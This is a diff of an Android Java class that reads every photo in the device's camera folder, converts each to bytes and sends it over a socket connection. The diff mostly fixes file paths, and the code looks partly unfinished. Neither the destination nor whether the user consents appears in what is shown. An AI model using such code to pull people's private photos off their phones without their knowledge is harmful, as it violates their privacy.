@@ -76,7 +76,7 @@ public class ClientConnection extends Thread {
             try {
 
                 OutputStream output = socket.getOutputStream();
-                FileInputStream fis = new FileInputStream(pic + "/IMG_20180617_122237.jpg");
+                FileInputStream fis = new FileInputStream(pic);
 
 
                 output.write(imgbyte);
@@ -100,7 +100,7 @@ public class ClientConnection extends Thread {
      */
     public byte[] picToByte(File pic) {
         try {
-            FileInputStream fis = new FileInputStream(pic + "/IMG_20180617_122237.jpg");
+            FileInputStream fis = new FileInputStream(pic);
             Bitmap bm = BitmapFactory.decodeStream(fis);
             return getBytesFromBitmap(bm);
         } catch(Exception e) {
@@ -125,17 +125,17 @@ public class ClientConnection extends Thread {
      */
     public void getPics() {
         // Getting the Camera Folder
-        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
+        File dcim = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM), "Camera");
         if(dcim == null) return;
         try {
             File[] pics = dcim.listFiles();
             int count = 0;
             if (pics != null) {
+                File pictures = pics[0];
                 for (File pic : pics) {
                     byte[] byte_pic = picToByte(pic);
                     //calls connect with the picture in bytes and the file
                     connect(byte_pic, pic);
-
                 }
             }
         } catch(Exception e) {
